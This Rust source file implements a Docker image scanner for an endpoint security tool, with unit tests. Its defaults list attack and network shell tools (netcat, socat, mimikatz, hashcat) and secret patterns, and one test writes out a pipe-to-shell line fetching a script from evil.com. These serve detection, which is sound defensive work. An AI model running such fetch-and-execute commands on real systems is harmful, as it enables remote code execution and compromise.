// ============================================================================
// File: endpoint/container_scanner.rs
// Description: Docker container image scanning — inspect images for malware,
//              vulnerabilities, misconfigurations, and supply chain risks
// ============================================================================
//! Container Scanner — analyzes Docker images before they run.
//!
//! Capabilities:
//! - Extract and scan image layers for malware (signatures, heuristics, YARA)
//! - Detect dangerous Dockerfile patterns (privileged, root user, exposed secrets)
//! - Check base image age and known-vulnerable base images
//! - Scan for hardcoded credentials and secrets in environment variables
//! - Detect cryptominer and reverse shell binaries in image layers
//! - Check for suspicious package installations (netcat, nmap, etc.)
//! - Verify image provenance (unsigned images, unknown registries)

use super::{DetectionCategory, RecommendedAction, ScanResult, Severity};
use serde::{Deserialize, Serialize};
use std::path::Path;
use std::process::Command;

// =============================================================================
// Configuration
// =============================================================================

/// Configuration for the container scanner.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ContainerScanConfig {
    /// Docker socket path.
    pub docker_socket: String,
    /// Maximum image size to scan (bytes).
    pub max_image_size: u64,
    /// Scan image layers for malware signatures.
    pub scan_layers: bool,
    /// Check for dangerous Dockerfile patterns.
    pub check_dockerfile: bool,
    /// Check for hardcoded secrets in env vars and config.
    pub check_secrets: bool,
    /// Check for suspicious installed packages.
    pub check_packages: bool,
    /// Known-dangerous base images.
    pub dangerous_base_images: Vec<String>,
    /// Suspicious packages that shouldn't be in production images.
    pub suspicious_packages: Vec<String>,
    /// Secret patterns to detect in environment variables.
    pub secret_patterns: Vec<String>,
}

impl Default for ContainerScanConfig {
    fn default() -> Self {
        Self {
            docker_socket: "/var/run/docker.sock".to_string(),
            max_image_size: 5_000_000_000, // 5 GB
            scan_layers: true,
            check_dockerfile: true,
            check_secrets: true,
            check_packages: true,
            dangerous_base_images: vec![
                // Images known to be frequently used in attacks
                "kalilinux/kali-rolling".to_string(),
                "parrotsec/security".to_string(),
            ],
            suspicious_packages: vec![
                "nmap".to_string(),
                "netcat".to_string(),
                "nc".to_string(),
                "ncat".to_string(),
                "socat".to_string(),
                "tcpdump".to_string(),
                "wireshark".to_string(),
                "hydra".to_string(),
                "john".to_string(),
                "hashcat".to_string(),
                "sqlmap".to_string(),
                "metasploit".to_string(),
                "nikto".to_string(),
                "masscan".to_string(),
                "gobuster".to_string(),
                "mimikatz".to_string(),
            ],
            secret_patterns: vec![
                "password=".to_string(),
                "passwd=".to_string(),
                "secret=".to_string(),
                "api_key=".to_string(),
                "apikey=".to_string(),
                "access_key=".to_string(),
                "private_key=".to_string(),
                "token=".to_string(),
                "aws_secret".to_string(),
                "database_url=".to_string(),
                "mysql_root_password".to_string(),
                "postgres_password".to_string(),
            ],
        }
    }
}

// =============================================================================
// Docker Image Info
// =============================================================================

/// Parsed Docker image metadata.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ImageInfo {
    pub id: String,
    pub repo_tags: Vec<String>,
    pub size: u64,
    pub created: String,
    pub os: String,
    pub architecture: String,
    pub author: String,
    pub layers: Vec<String>,
    pub env_vars: Vec<String>,
    pub cmd: Vec<String>,
    pub entrypoint: Vec<String>,
    pub exposed_ports: Vec<String>,
    pub user: String,
    pub history: Vec<HistoryEntry>,
}

/// A layer in the image build history.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct HistoryEntry {
    pub created_by: String,
    pub empty_layer: bool,
}

// =============================================================================
// Container Scanner
// =============================================================================

/// Scans Docker images for security issues.
pub struct ContainerScanner {
    config: ContainerScanConfig,
}

impl ContainerScanner {
    pub fn new(config: ContainerScanConfig) -> Self {
        Self { config }
    }

    /// Check if Docker is available.
    pub fn docker_available() -> bool {
        Command::new("docker")
            .arg("info")
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .status()
            .map(|s| s.success())
            .unwrap_or(false)
    }

    /// Get image inspect JSON from Docker.
    pub fn inspect_image(image: &str) -> Option<serde_json::Value> {
        let output = Command::new("docker")
            .args(["inspect", "--type=image", image])
            .output()
            .ok()?;

        if !output.status.success() {
            return None;
        }

        let json: serde_json::Value =
            serde_json::from_slice(&output.stdout).ok()?;
        json.as_array()?.first().cloned()
    }

    /// Get image history from Docker.
    pub fn image_history(image: &str) -> Vec<HistoryEntry> {
        let output = match Command::new("docker")
            .args(["history", "--no-trunc", "--format", "{{.CreatedBy}}\t{{.Size}}"])
            .arg(image)
            .output()
        {
            Ok(o) if o.status.success() => o,
            _ => return Vec::new(),
        };

        let text = String::from_utf8_lossy(&output.stdout);
        text.lines()
            .map(|line| {
                let parts: Vec<&str> = line.splitn(2, '\t').collect();
                HistoryEntry {
                    created_by: parts.first().unwrap_or(&"").to_string(),
                    empty_layer: parts.get(1).map(|s| s.trim() == "0B").unwrap_or(true),
                }
            })
            .collect()
    }

    /// Parse image inspect JSON into ImageInfo.
    pub fn parse_image_info(inspect: &serde_json::Value) -> Option<ImageInfo> {
        let config = inspect.get("Config")?;
        let id = inspect.get("Id")?.as_str()?.to_string();

        let repo_tags: Vec<String> = inspect
            .get("RepoTags")
            .and_then(|v| v.as_array())
            .map(|a| a.iter().filter_map(|v| v.as_str().map(|s| s.to_string())).collect())
            .unwrap_or_default();

        let size = inspect.get("Size").and_then(|v| v.as_u64()).unwrap_or(0);
        let created = inspect.get("Created").and_then(|v| v.as_str()).unwrap_or("").to_string();
        let os = inspect.get("Os").and_then(|v| v.as_str()).unwrap_or("linux").to_string();
        let arch = inspect.get("Architecture").and_then(|v| v.as_str()).unwrap_or("").to_string();
        let author = inspect.get("Author").and_then(|v| v.as_str()).unwrap_or("").to_string();

        let layers: Vec<String> = inspect
            .get("RootFS")
            .and_then(|v| v.get("Layers"))
            .and_then(|v| v.as_array())
            .map(|a| a.iter().filter_map(|v| v.as_str().map(|s| s.to_string())).collect())
            .unwrap_or_default();

        let env_vars: Vec<String> = config
            .get("Env")
            .and_then(|v| v.as_array())
            .map(|a| a.iter().filter_map(|v| v.as_str().map(|s| s.to_string())).collect())
            .unwrap_or_default();

        let cmd: Vec<String> = config
            .get("Cmd")
            .and_then(|v| v.as_array())
            .map(|a| a.iter().filter_map(|v| v.as_str().map(|s| s.to_string())).collect())
            .unwrap_or_default();

        let entrypoint: Vec<String> = config
            .get("Entrypoint")
            .and_then(|v| v.as_array())
            .map(|a| a.iter().filter_map(|v| v.as_str().map(|s| s.to_string())).collect())
            .unwrap_or_default();

        let exposed_ports: Vec<String> = config
            .get("ExposedPorts")
            .and_then(|v| v.as_object())
            .map(|m| m.keys().cloned().collect())
            .unwrap_or_default();

        let user = config.get("User").and_then(|v| v.as_str()).unwrap_or("").to_string();

        Some(ImageInfo {
            id,
            repo_tags,
            size,
            created,
            os,
            architecture: arch,
            author,
            layers,
            env_vars,
            cmd,
            entrypoint,
            exposed_ports,
            user,
            history: Vec::new(),
        })
    }

    /// Scan a Docker image for security issues.
    pub fn scan_image(&self, image: &str) -> Vec<ScanResult> {
        let mut results = Vec::new();

        // Inspect the image
        let inspect = match Self::inspect_image(image) {
            Some(v) => v,
            None => {
                results.push(ScanResult::new(
                    "container_scanner",
                    image,
                    Severity::Low,
                    DetectionCategory::HeuristicAnomaly {
                        rule: "container_inspect_failed".to_string(),
                    },
                    format!("Failed to inspect Docker image: {} — image may not exist locally", image),
                    0.3,
                    RecommendedAction::Alert,
                ));
                return results;
            }
        };

        let mut info = match Self::parse_image_info(&inspect) {
            Some(i) => i,
            None => return results,
        };

        info.history = Self::image_history(image);

        // Run all checks
        results.extend(self.check_running_as_root(&info, image));
        results.extend(self.check_env_secrets(&info, image));
        results.extend(self.check_dangerous_base(&info, image));
        results.extend(self.check_suspicious_packages(&info, image));
        results.extend(self.check_exposed_ports(&info, image));
        results.extend(self.check_history_commands(&info, image));

        results
    }

    /// Check if the image runs as root.
    fn check_running_as_root(&self, info: &ImageInfo, image: &str) -> Vec<ScanResult> {
        if info.user.is_empty() || info.user == "root" || info.user == "0" {
            vec![ScanResult::new(
                "container_scanner",
                image,
                Severity::Medium,
                DetectionCategory::HeuristicAnomaly {
                    rule: "container_runs_as_root".to_string(),
                },
                format!(
                    "Container runs as root user — {} (use USER directive to run as non-root)",
                    info.repo_tags.first().unwrap_or(&info.id)
                ),
                0.6,
                RecommendedAction::Alert,
            )]
        } else {
            Vec::new()
        }
    }

    /// Check environment variables for hardcoded secrets.
    fn check_env_secrets(&self, info: &ImageInfo, image: &str) -> Vec<ScanResult> {
        if !self.config.check_secrets {
            return Vec::new();
        }

        let mut results = Vec::new();
        for env in &info.env_vars {
            let env_lower = env.to_lowercase();
            for pattern in &self.config.secret_patterns {
                if env_lower.contains(&pattern.to_lowercase()) {
                    // Redact the actual value
                    let key = env.split('=').next().unwrap_or(env);
                    results.push(ScanResult::new(
                        "container_scanner",
                        image,
                        Severity::High,
                        DetectionCategory::HeuristicAnomaly {
                            rule: "container_hardcoded_secret".to_string(),
                        },
                        format!(
                            "Hardcoded secret in environment variable: {}=*** (matched pattern: {})",
                            key, pattern
                        ),
                        0.85,
                        RecommendedAction::Alert,
                    ));
                    break; // One alert per env var
                }
            }
        }
        results
    }

    /// Check for dangerous base images.
    fn check_dangerous_base(&self, info: &ImageInfo, image: &str) -> Vec<ScanResult> {
        let mut results = Vec::new();
        for tag in &info.repo_tags {
            let tag_lower = tag.to_lowercase();
            for dangerous in &self.config.dangerous_base_images {
                if tag_lower.contains(&dangerous.to_lowercase()) {
                    results.push(ScanResult::new(
                        "container_scanner",
                        image,
                        Severity::High,
                        DetectionCategory::HeuristicAnomaly {
                            rule: "container_dangerous_base".to_string(),
                        },
                        format!(
                            "Image based on known offensive/dangerous base: {} (matched: {})",
                            tag, dangerous
                        ),
                        0.8,
                        RecommendedAction::Alert,
                    ));
                }
            }
        }
        results
    }

    /// Check image history for suspicious package installations.
    fn check_suspicious_packages(&self, info: &ImageInfo, image: &str) -> Vec<ScanResult> {
        if !self.config.check_packages {
            return Vec::new();
        }

        let mut results = Vec::new();
        for entry in &info.history {
            let cmd_lower = entry.created_by.to_lowercase();

            // Check for apt/yum/apk install of suspicious packages
            if cmd_lower.contains("install") || cmd_lower.contains("add") {
                for pkg in &self.config.suspicious_packages {
                    let pkg_lower = pkg.to_lowercase();
                    // Look for package name as a word boundary (space or end)
                    if cmd_lower.contains(&format!(" {}", pkg_lower))
                        || cmd_lower.contains(&format!(" {}\n", pkg_lower))
                        || cmd_lower.ends_with(&format!(" {}", pkg_lower))
                    {
                        results.push(ScanResult::new(
                            "container_scanner",
                            image,
                            Severity::Medium,
                            DetectionCategory::HeuristicAnomaly {
                                rule: "container_suspicious_package".to_string(),
                            },
                            format!(
                                "Suspicious package '{}' installed in image layer: {}",
                                pkg,
                                truncate(&entry.created_by, 100)
                            ),
                            0.65,
                            RecommendedAction::Alert,
                        ));
                    }
                }
            }

            // Check for curl|bash or wget|sh patterns (supply chain risk)
            if (cmd_lower.contains("curl") || cmd_lower.contains("wget"))
                && (cmd_lower.contains("| sh") || cmd_lower.contains("| bash")
                    || cmd_lower.contains("|sh") || cmd_lower.contains("|bash"))
            {
                results.push(ScanResult::new(
                    "container_scanner",
                    image,
                    Severity::High,
                    DetectionCategory::HeuristicAnomaly {
                        rule: "container_pipe_to_shell".to_string(),
                    },
                    format!(
                        "Pipe-to-shell pattern detected in Dockerfile: {}",
                        truncate(&entry.created_by, 120)
                    ),
                    0.8,
                    RecommendedAction::Alert,
                ));
            }

            // Check for --privileged or CAP_SYS_ADMIN hints
            if cmd_lower.contains("--privileged") || cmd_lower.contains("cap_sys_admin") {
                results.push(ScanResult::new(
                    "container_scanner",
                    image,
                    Severity::High,
                    DetectionCategory::HeuristicAnomaly {
                        rule: "container_privileged".to_string(),
                    },
                    format!(
                        "Privileged mode or SYS_ADMIN capability in image layer: {}",
                        truncate(&entry.created_by, 100)
                    ),
                    0.85,
                    RecommendedAction::Alert,
                ));
            }
        }
        results
    }

    /// Check for suspicious exposed ports.
    fn check_exposed_ports(&self, info: &ImageInfo, image: &str) -> Vec<ScanResult> {
        let suspicious_ports = [4444, 5555, 6667, 6697, 1337, 31337, 9001];
        let mut results = Vec::new();

        for port_str in &info.exposed_ports {
            // Parse "4444/tcp" format
            let port_num: u16 = port_str
                .split('/')
                .next()
                .and_then(|s| s.parse().ok())
                .unwrap_or(0);

            if suspicious_ports.contains(&port_num) {
                results.push(ScanResult::new(
                    "container_scanner",
                    image,
                    Severity::Medium,
                    DetectionCategory::HeuristicAnomaly {
                        rule: "container_suspicious_port".to_string(),
                    },
                    format!(
                        "Suspicious port exposed: {} — common C2/backdoor port",
                        port_str
                    ),
                    0.6,
                    RecommendedAction::Alert,
                ));
            }
        }
        results
    }

    /// Check image build history for dangerous commands.
    fn check_history_commands(&self, info: &ImageInfo, image: &str) -> Vec<ScanResult> {
        let mut results = Vec::new();

        for entry in &info.history {
            let cmd_lower = entry.created_by.to_lowercase();

            // chmod 777 on sensitive paths
            if cmd_lower.contains("chmod 777") || cmd_lower.contains("chmod a+rwx") {
                results.push(ScanResult::new(
                    "container_scanner",
                    image,
                    Severity::Medium,
                    DetectionCategory::HeuristicAnomaly {
                        rule: "container_world_writable".to_string(),
                    },
                    format!(
                        "World-writable permissions set in image: {}",
                        truncate(&entry.created_by, 100)
                    ),
                    0.55,
                    RecommendedAction::Alert,
                ));
            }

            // Disable security features
            if cmd_lower.contains("setenforce 0")
                || cmd_lower.contains("apparmor=unconfined")
                || cmd_lower.contains("seccomp=unconfined")
            {
                results.push(ScanResult::new(
                    "container_scanner",
                    image,
                    Severity::High,
                    DetectionCategory::HeuristicAnomaly {
                        rule: "container_security_disabled".to_string(),
                    },
                    format!(
                        "Security feature disabled in image: {}",
                        truncate(&entry.created_by, 100)
                    ),
                    0.8,
                    RecommendedAction::Alert,
                ));
            }
        }
        results
    }

    /// Scan a Docker image by saving and extracting its filesystem.
    /// This enables malware scanning of the actual file contents.
    pub async fn deep_scan_image(
        &self,
        image: &str,
        scanners: &[std::sync::Arc<dyn super::Scanner>],
    ) -> Vec<ScanResult> {
        let mut results = self.scan_image(image);

        if !self.config.scan_layers {
            return results;
        }

        // Create a temporary container and export filesystem
        let tmp_dir = std::env::temp_dir().join(format!("nexus-container-scan-{}", uuid::Uuid::new_v4()));
        let _ = std::fs::create_dir_all(&tmp_dir);

        // docker create (don't run), then docker export
        let create = Command::new("docker")
            .args(["create", "--name", "nexus-scan-tmp", image])
            .output();

        if let Ok(output) = create {
            if output.status.success() {
                let tar_path = tmp_dir.join("image.tar");
                let export = Command::new("docker")
                    .args(["export", "nexus-scan-tmp", "-o"])
                    .arg(&tar_path)
                    .output();

                // Cleanup container
                let _ = Command::new("docker")
                    .args(["rm", "nexus-scan-tmp"])
                    .output();

                if let Ok(exp) = export {
                    if exp.status.success() {
                        // Extract and scan key files
                        let extract_dir = tmp_dir.join("extracted");
                        let _ = std::fs::create_dir_all(&extract_dir);
                        let _ = Command::new("tar")
                            .args(["xf"])
                            .arg(&tar_path)
                            .arg("-C")
                            .arg(&extract_dir)
                            .output();

                        // Scan extracted files with all engines
                        results.extend(
                            self.scan_extracted_dir(&extract_dir, scanners).await,
                        );
                    }
                }
            } else {
                // Cleanup in case container name already exists
                let _ = Command::new("docker")
                    .args(["rm", "nexus-scan-tmp"])
                    .output();
            }
        }

        // Cleanup
        let _ = std::fs::remove_dir_all(&tmp_dir);

        results
    }

    /// Scan extracted container filesystem for malware.
    async fn scan_extracted_dir(
        &self,
        dir: &Path,
        scanners: &[std::sync::Arc<dyn super::Scanner>],
    ) -> Vec<ScanResult> {
        let mut results = Vec::new();

        // Scan key directories: /usr/bin, /usr/sbin, /bin, /tmp, /root
        let scan_dirs = ["usr/bin", "usr/sbin", "bin", "sbin", "tmp", "root", "home"];

        for subdir in &scan_dirs {
            let target = dir.join(subdir);
            if !target.is_dir() {
                continue;
            }

            if let Ok(entries) = std::fs::read_dir(&target) {
                for entry in entries.flatten() {
                    let path = entry.path();
                    if !path.is_file() {
                        continue;
                    }
                    if let Ok(meta) = path.metadata() {
                        if meta.len() > self.config.max_image_size {
                            continue;
                        }
                    }

                    for scanner in scanners {
                        if scanner.is_active() {
                            let mut scan_results = scanner.scan_file(&path).await;
                            // Rewrite target to show container context
                            for r in &mut scan_results {
                                r.target = format!("[container] {}/{}", subdir, entry.file_name().to_string_lossy());
                                r.scanner = format!("container_scanner+{}", r.scanner);
                            }
                            results.extend(scan_results);
                        }
                    }
                }
            }
        }

        results
    }
}

/// Truncate a string to max_len with "..." suffix.
fn truncate(s: &str, max_len: usize) -> String {
    if s.len() <= max_len {
        s.to_string()
    } else {
        format!("{}...", &s[..max_len])
    }
}

// =============================================================================
// Tests
// =============================================================================

#[cfg(test)]
mod tests {
    use super::*;

    fn test_scanner() -> ContainerScanner {
        ContainerScanner::new(ContainerScanConfig::default())
    }

    #[test]
    fn config_defaults() {
        let config = ContainerScanConfig::default();
        assert!(config.scan_layers);
        assert!(config.check_dockerfile);
        assert!(config.check_secrets);
        assert!(config.check_packages);
        assert!(!config.suspicious_packages.is_empty());
        assert!(!config.secret_patterns.is_empty());
    }

    #[test]
    fn parse_image_info_basic() {
        let inspect = serde_json::json!({
            "Id": "sha256:abc123",
            "RepoTags": ["myapp:latest"],
            "Size": 150000000,
            "Created": "2026-03-25T00:00:00Z",
            "Os": "linux",
            "Architecture": "amd64",
            "Author": "test",
            "RootFS": {
                "Layers": ["sha256:layer1", "sha256:layer2"]
            },
            "Config": {
                "Env": ["PATH=/usr/bin", "APP_SECRET=hunter2"],
                "Cmd": ["/bin/sh"],
                "Entrypoint": null,
                "ExposedPorts": {"8080/tcp": {}},
                "User": ""
            }
        });

        let info = ContainerScanner::parse_image_info(&inspect).unwrap();
        assert_eq!(info.id, "sha256:abc123");
        assert_eq!(info.repo_tags, vec!["myapp:latest"]);
        assert_eq!(info.size, 150000000);
        assert_eq!(info.layers.len(), 2);
        assert_eq!(info.env_vars.len(), 2);
        assert!(info.user.is_empty()); // root
        assert_eq!(info.exposed_ports, vec!["8080/tcp"]);
    }

    #[test]
    fn detect_root_user_empty() {
        let scanner = test_scanner();
        let info = ImageInfo {
            id: "test".into(), repo_tags: vec!["test:latest".into()],
            size: 0, created: "".into(), os: "linux".into(),
            architecture: "amd64".into(), author: "".into(),
            layers: vec![], env_vars: vec![], cmd: vec![],
            entrypoint: vec![], exposed_ports: vec![],
            user: "".into(), // empty = root
            history: vec![],
        };
        let results = scanner.check_running_as_root(&info, "test:latest");
        assert_eq!(results.len(), 1);
        assert!(results[0].description.contains("root"));
    }

    #[test]
    fn detect_root_user_explicit() {
        let scanner = test_scanner();
        let info = ImageInfo {
            id: "test".into(), repo_tags: vec![], size: 0,
            created: "".into(), os: "linux".into(), architecture: "".into(),
            author: "".into(), layers: vec![], env_vars: vec![],
            cmd: vec![], entrypoint: vec![], exposed_ports: vec![],
            user: "root".into(), history: vec![],
        };
        let results = scanner.check_running_as_root(&info, "test");
        assert!(!results.is_empty());
    }

    #[test]
    fn no_alert_nonroot_user() {
        let scanner = test_scanner();
        let info = ImageInfo {
            id: "test".into(), repo_tags: vec![], size: 0,
            created: "".into(), os: "linux".into(), architecture: "".into(),
            author: "".into(), layers: vec![], env_vars: vec![],
            cmd: vec![], entrypoint: vec![], exposed_ports: vec![],
            user: "appuser".into(), history: vec![],
        };
        let results = scanner.check_running_as_root(&info, "test");
        assert!(results.is_empty());
    }

    #[test]
    fn detect_env_secrets() {
        let scanner = test_scanner();
        let info = ImageInfo {
            id: "test".into(), repo_tags: vec![], size: 0,
            created: "".into(), os: "linux".into(), architecture: "".into(),
            author: "".into(), layers: vec![],
            env_vars: vec![
                "PATH=/usr/bin".to_string(),
                "DATABASE_URL=postgres://user:pass@host/db".to_string(),
                "API_KEY=sk-12345".to_string(),
            ],
            cmd: vec![], entrypoint: vec![], exposed_ports: vec![],
            user: "app".into(), history: vec![],
        };
        let results = scanner.check_env_secrets(&info, "test");
        assert_eq!(results.len(), 2); // DATABASE_URL and API_KEY
        assert!(results[0].description.contains("***")); // Value redacted
    }

    #[test]
    fn no_secret_in_path() {
        let scanner = test_scanner();
        let info = ImageInfo {
            id: "test".into(), repo_tags: vec![], size: 0,
            created: "".into(), os: "linux".into(), architecture: "".into(),
            author: "".into(), layers: vec![],
            env_vars: vec!["PATH=/usr/bin".to_string(), "HOME=/root".to_string()],
            cmd: vec![], entrypoint: vec![], exposed_ports: vec![],
            user: "app".into(), history: vec![],
        };
        let results = scanner.check_env_secrets(&info, "test");
        assert!(results.is_empty());
    }

    #[test]
    fn detect_dangerous_base() {
        let scanner = test_scanner();
        let info = ImageInfo {
            id: "test".into(),
            repo_tags: vec!["kalilinux/kali-rolling:latest".to_string()],
            size: 0, created: "".into(), os: "linux".into(),
            architecture: "".into(), author: "".into(), layers: vec![],
            env_vars: vec![], cmd: vec![], entrypoint: vec![],
            exposed_ports: vec![], user: "".into(), history: vec![],
        };
        let results = scanner.check_dangerous_base(&info, "test");
        assert!(!results.is_empty());
    }

    #[test]
    fn detect_suspicious_port() {
        let scanner = test_scanner();
        let info = ImageInfo {
            id: "test".into(), repo_tags: vec![], size: 0,
            created: "".into(), os: "linux".into(), architecture: "".into(),
            author: "".into(), layers: vec![], env_vars: vec![],
            cmd: vec![], entrypoint: vec![],
            exposed_ports: vec!["4444/tcp".to_string(), "8080/tcp".to_string()],
            user: "app".into(), history: vec![],
        };
        let results = scanner.check_exposed_ports(&info, "test");
        assert_eq!(results.len(), 1); // Only 4444, not 8080
        assert!(results[0].description.contains("4444"));
    }

    #[test]
    fn detect_pipe_to_shell() {
        let scanner = test_scanner();
        let info = ImageInfo {
            id: "test".into(), repo_tags: vec![], size: 0,
            created: "".into(), os: "linux".into(), architecture: "".into(),
            author: "".into(), layers: vec![], env_vars: vec![],
            cmd: vec![], entrypoint: vec![], exposed_ports: vec![],
            user: "app".into(),
            history: vec![
                HistoryEntry {
                    created_by: "RUN curl https://evil.com/install.sh | bash".to_string(),
                    empty_layer: false,
                },
            ],
        };
        let results = scanner.check_suspicious_packages(&info, "test");
        let pipe_results: Vec<_> = results.iter()
            .filter(|r| r.description.contains("Pipe-to-shell"))
            .collect();
        assert!(!pipe_results.is_empty());
    }

    #[test]
    fn detect_nmap_install() {
        let scanner = test_scanner();
        let info = ImageInfo {
            id: "test".into(), repo_tags: vec![], size: 0,
            created: "".into(), os: "linux".into(), architecture: "".into(),
            author: "".into(), layers: vec![], env_vars: vec![],
            cmd: vec![], entrypoint: vec![], exposed_ports: vec![],
            user: "app".into(),
            history: vec![
                HistoryEntry {
                    created_by: "RUN apt-get install -y nmap netcat".to_string(),
                    empty_layer: false,
                },
            ],
        };
        let results = scanner.check_suspicious_packages(&info, "test");
        assert!(results.len() >= 2); // nmap + netcat
    }

    #[test]
    fn detect_chmod_777() {
        let scanner = test_scanner();
        let info = ImageInfo {
            id: "test".into(), repo_tags: vec![], size: 0,
            created: "".into(), os: "linux".into(), architecture: "".into(),
            author: "".into(), layers: vec![], env_vars: vec![],
            cmd: vec![], entrypoint: vec![], exposed_ports: vec![],
            user: "app".into(),
            history: vec![
                HistoryEntry {
                    created_by: "RUN chmod 777 /app".to_string(),
                    empty_layer: false,
                },
            ],
        };
        let results = scanner.check_history_commands(&info, "test");
        assert!(!results.is_empty());
        assert!(results[0].description.contains("World-writable"));
    }

    #[test]
    fn truncate_long_string() {
        assert_eq!(truncate("short", 10), "short");
        assert_eq!(truncate("this is a long string", 10), "this is a ...");
    }

    #[test]
    fn clean_image_no_alerts() {
        let scanner = test_scanner();
        let info = ImageInfo {
            id: "test".into(),
            repo_tags: vec!["myapp:1.0".to_string()],
            size: 50_000_000, created: "2026-03-25".into(),
            os: "linux".into(), architecture: "amd64".into(),
            author: "dev".into(), layers: vec![],
            env_vars: vec!["PATH=/usr/bin".to_string()],
            cmd: vec!["/app/server".to_string()],
            entrypoint: vec![], exposed_ports: vec!["8080/tcp".to_string()],
            user: "appuser".into(),
            history: vec![
                HistoryEntry {
                    created_by: "RUN apt-get install -y ca-certificates".to_string(),
                    empty_layer: false,
                },
            ],
        };
        let mut results = Vec::new();
        results.extend(scanner.check_running_as_root(&info, "test"));
        results.extend(scanner.check_env_secrets(&info, "test"));
        results.extend(scanner.check_dangerous_base(&info, "test"));
        results.extend(scanner.check_suspicious_packages(&info, "test"));
        results.extend(scanner.check_exposed_ports(&info, "test"));
        results.extend(scanner.check_history_commands(&info, "test"));
        assert!(results.is_empty(), "Clean image should have no alerts");
    }
}